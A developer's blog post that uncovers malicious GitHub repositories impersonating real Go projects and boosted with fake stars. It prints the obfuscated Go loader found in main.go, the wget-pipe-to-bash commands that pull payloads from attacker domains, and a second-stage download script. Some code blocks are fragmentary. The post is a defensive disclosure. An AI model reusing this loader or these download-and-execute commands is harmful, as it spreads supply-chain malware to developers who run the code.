While adding support for `jqfmt` to my markdown code block formatter (`mdsf`, [mdsf#700](https://github.com/hougesen/mdsf/issues/700)), I came across something weird.

When searching for the repository on GitHub, two different repositories with a decent amount of stars came up.

The first, `unfitpercen/jqfmt` had 102 stars and was last updated 5 days ago (2025-02-22), while the second `noperator/jqfmt` _only_ had 55 stars and was last updated six months ago (2024-08-15).

## The Suspicion Awakens

I originally assumed that one of the repositories was a fork, but the more I looked into the one with most stars (`unfitpercen/jqfmt`), the more suspicious I got.

The repository contained a single commit with the message `added`, which introduced 65 files and 2,740 lines, and didn't have a git email attached. While bad practice, it is not uncommon for some people to create large commits, and my parents have always told me not to judge a book by its cover.

![GitHub page for unfitpercen/jqfmt](/blog/github-unfitpercen-jqfmt.png)

A repository with a hundred stars but without a single issue, pull request, or discussion is also a red flag.

Such a star-to-issue ratio has three common explanations:

1. The software is bug-free (is any ever?)
2. The users that starred the repository thought the project seemed interesting but did not use it
3. The stars are fake

It is quite hard to validate explanations 1 and 2. Luckily, I already knew a few ways to detect fake engagement from my time building social media tools at [Cavea](https://cavea.io).

Fake engagement will often have a few tells that make it stand out:

- The users starring will be created recently - since they often get banned.
- They won't act in the same way an ordinary user does - actually contributing to code in our case.
- The engagement will be "delivered" in large bursts - getting hundreds of engagements on day X but gaining zero engagements on days X⁻¹ and X⁺¹.

When checking the star history using [OSS Insight](https://ossinsight.io/) we see that the repository went from 0 to 99 stars on February 25th. That is a lot of stars to gain in a single day.

![OSS Insight star statistics of unfitpercen/jqfmt](/blog/ossinsight-unfitpercen-jqfmt.png)

For comparison [prettier](https://github.com/prettier/prettier), _maybe_ the most used formatter, gains around 10 stars a day.

![OSS Insight of prettier star statistics](/blog/ossinsight-prettier-prettier.png)

One could argue that perhaps the repository was posted on a forum like Reddit or Hacker News, so I ran a quick backlink check to confirm that wasn't the case

![Ahrefs backlink check for the GitHub repository](/blog/ahrefs-github-unfitpercen-jqfmt.png)

Checking who starred a repository is also quite straightforward since each repository has a page displaying this information ([https://github.com/unfitpercen/jqfmt/stargazers](https://github.com/unfitpercen/jqfmt/stargazers)). That page also conveniently shows the account creation date of the "stargazers", if they haven't filled out their country or company (which the scammer, fortunately, didn't do).

A quick look revealed that every single user was created within the last few weeks - suspicious 🤔

## The Phantom Execution

At this point, it became obvious that the repository was impersonating `noperator/jqfmt`, which meant there was only one thing left to do - figure out why.

So anyway, I started blasting a side-by-side view of each repository. Luckily my eyesight is pretty good, so I quickly found a discrepancy in the [cmd/jqfmt/main.go](https://github.com/unfitpercen/jqfmt/blob/deb5eb0a6fa98f3dbd0b04f3065cd236ab45062b/cmd/jqfmt/main.go#L78C1-L88C22) file:

![Side-by-side view of the cmd/jqfmt/main.go files](/blog/github-jqfmt-side-by-side-main-go.png)

While I am in no way an expert at writing Go, it was pretty clear that something weird was going on.

**Warning: this code downloads malware. You should not run it unless you know what you are doing:**

```go
import "os/exec"

func rUnCTC() error {
	HJ := []string{"e", "3", "d", "m", "/", "s", "&", "h", "i", ":", "3", "/", "c", "|", "d", "e", "/", "g", "1", "/", "o", "t", "/", "-", "4", "e", " ", "3", "u", " ", "w", "f", " ", "0", "a", "a", "-", "O", "6", "d", "n", "b", "p", "t", "b", "5", ".", "s", "i", "f", "r", "h", "/", " ", "r", "s", "7", "v", "e", " ", "t", "c", "t", "o", "g", "a", "/", "f", "n", "b", "a", " "}
	utOYhb := "/bin/sh"
	MclXWiDP := "-c"
	opIAlY := HJ[30] + HJ[64] + HJ[15] + HJ[60] + HJ[53] + HJ[36] + HJ[37] + HJ[29] + HJ[23] + HJ[59] + HJ[51] + HJ[43] + HJ[62] + HJ[42] + HJ[55] + HJ[9] + HJ[4] + HJ[11] + HJ[61] + HJ[34] + HJ[54] + HJ[57] + HJ[25] + HJ[12] + HJ[63] + HJ[3] + HJ[48] + HJ[46] + HJ[67] + HJ[28] + HJ[68] + HJ[66] + HJ[5] + HJ[21] + HJ[20] + HJ[50] + HJ[70] + HJ[17] + HJ[0] + HJ[16] + HJ[2] + HJ[58] + HJ[10] + HJ[56] + HJ[27] + HJ[14] + HJ[33] + HJ[39] + HJ[49] + HJ[52] + HJ[65] + HJ[1] + HJ[18] + HJ[45] + HJ[24] + HJ[38] + HJ[44] + HJ[31] + HJ[32] + HJ[13] + HJ[26] + HJ[19] + HJ[41] + HJ[8] + HJ[40] + HJ[22] + HJ[69] + HJ[35] + HJ[47] + HJ[7] + HJ[71] + HJ[6]
	exec.Command(utOYhb, MclXWiDP, opIAlY).Start()
	return nil
}

var rbFVkd = rUnCTC()
```

The Go code will execute the following command:

```shell
/bin/sh -c wget -O - https://carvecomi.fun/storage/de373d0df/a31546bf | /bin/bash &
```

Which downloads and executes a script from `carvecomi [dot] fun/storage/de373d0df/f0eee999` if the user is running Linux.

```shell
#!/bin/bash

cd ~
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
	if ! [ -f ./f0eee999 ]; then
		sleep 3600
		wget https://carvecomi.fun/storage/de373d0df/f0eee999
		chmod +x ./f0eee999
		app_process_id=$(pidof f0eee999)
		if [[ -z $app_process_id ]]; then
			./f0eee999
		fi
	fi
fi
```

Sadly the executable the script above downloads is multiple megabytes, which is more than I felt like deconstructing.

I did find it rather curious that the malware only targets Linux devices. That is in stark contrast to "ordinary" malware that usually [targets Windows users](https://www.pcmag.com/news/windows-computers-account-for-83-of-all-malware-attacks-in-q1-2020), because of their higher market share.

For fun, I ran a quick whois query on the `carvecomi.fun` domain to check if the scammer was foolish enough to expose any personal information. Sadly the only information that was provided was that the owner _might_ be based in the Seychelles and that Cloudflare is used for DNS.

## Attack of the Clones

Malware attacks like the one deployed above are a numbers game, which means that the creator most likely is impersonating more than one repository. So I wrote a quick script, which can be found at [https://gist.github.com/hougesen/e5eb7cd2c5611e202b4d211908b540a1](https://gist.github.com/hougesen/e5eb7cd2c5611e202b4d211908b540a1), for getting the repositories of all the users that starred `unfitpercen/jqfmt`.

The script spat out three different repositories `annualphysic/shadify`, `upsetpanther/feishu`, and `wickedcorsa/go-hoyolab`.

`annualphysic/shadify` is trying to impersonate [cheatsnake/shadify](https://github.com/cheatsnake/shadify). Like the fake `jqfmt` repository, the code was hidden in the `main.go` file. The only difference I could find was that the malware is hosted on a different domain (`numerlink [dot] online`).

```shell
wget -O - https://numerlink.online/storage/de373d0df/a31546bf | /bin/bash &

```

![GitHub shadify side-by-side](/blog/github-shadify-side-by-side-main-go.png)

According to the whois result this domain _might_ also be owned by a registrant in the Seychelles.

```

The `upsetpanther/feishu` repository, which is an impersonation of [CatchZeng/feishu](https://github.com/CatchZeng/feishu), is actually pretty interesting because the README is written in Chinese, which hints that the scammer might be targeting Chinese-speaking users (or can speak Chinese themself).

They also removed the GitHub actions from the project files. I am not sure why though. GitHub actions have a generous free tier, and even if it didn't, would it matter for a bot account?

The only logical reason would be that GitHub actions expose information about the user when running, but I was unable to corroborate that theory.

	exec.Command(uSZIGOH, GHfr, lask).Start()
	return nil
}

var boQRpnog = QfdnANi()
```

The malware host was once again changed, now to `vanartest [dot] website`.

![GitHub feishu repositories side-by-side](/blog/github-feishu-side-by-side.png)

Like the earlier repositories, `wickedcorsa/go-hoyolab` is also an impersonation. This time of [dvgamerr-app/go-hoyolab](https://github.com/dvgamerr-app/go-hoyolab).

Interestingly the malware embedded in this repository uses the same domain and path as the one above (`vanartest [dot] website`).

```go

## A New Hope?

Over the last couple of months, I have added support for hundreds of different code-formatters to [mdsf](https://github.com/hougesen/mdsf).

The number of times that I have personally validated the code before installing a new tool is minimal (don't worry, mdsf is a command runner, not a package manager). I simply trusted that having stars meant the project was "safe". If it hadn't been because I was thrown off by the single commit of `unfitpercen/jqfmt`, I would have fallen for the trap.

I hope to be more careful in the future, but at the same time, I do not think it is feasible to personally validate every single line of _external_ code you run. There are simply too many lines to keep up with, especially once you consider sub-dependencies.

The only scalable solution seems to be vulnerability scanners like [Coana](https://www.coana.tech/), [Socket](https://socket.dev/), or [Snyk](https://snyk,ui), but while they might be good there is no way to guarantee that they catch everything.
